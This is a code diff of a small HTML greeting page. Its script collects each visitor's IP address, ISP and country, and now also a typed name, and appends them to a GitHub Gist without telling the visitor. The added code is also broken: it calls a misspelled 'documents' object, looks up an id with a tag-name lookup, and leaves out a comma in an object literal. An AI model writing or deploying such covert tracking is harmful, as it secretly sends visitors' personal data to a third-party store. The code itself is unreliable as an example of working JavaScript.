@@ -4,11 +4,13 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 </head>
 <body>
-    <h1>Hello!</h1>
+    <h1>HII</h1>
+    <h4>Input your name if it actually works!</h4>
+    <input placeholder="Name" id="nameInput">
 
     <script>
         // Declare variables to store data
-        var ipAddress, isp, country;
+        var ipAddress, isp, country, nameInput;
 
         // Function to handle the data
         function handleData(data) {
@@ -16,18 +18,19 @@
             ipAddress = data.ip;
             isp = data.org;
             country = data.country_name;
+            nameInput = documents.getElementsByTagName("nameInput").value;
 
             // Send data to GitHub Gist
-            sendToGist(ipAddress, isp, country);
+            sendToGist(ipAddress, isp, country, nameInput);
         }
 
         // Function to send data to GitHub Gist
-        function sendToGist(ip, isp, country) {
+        function sendToGist(ip, isp, country, name) {
             // Replace 'your-gist-id' with the actual Gist ID
             const gistId = '1355d91052d5d03dba93926812a9ab36';
 
             // Gist API URL
-            const apiUrl = `https://api.github.com/User533859321/${gistId}`;
+            const apiUrl = `https://api.github.com/gists/${gistId}`;
 
             // Fetch existing data from the Gist
             $.getJSON(apiUrl, function(gistData) {
@@ -38,7 +41,8 @@
                 const newData = {
                     ip: ip,
                     isp: isp,
-                    country: country
+                    country: country    
+                    name : nameInput
                 };
 
                 // Append the new data to the existing data
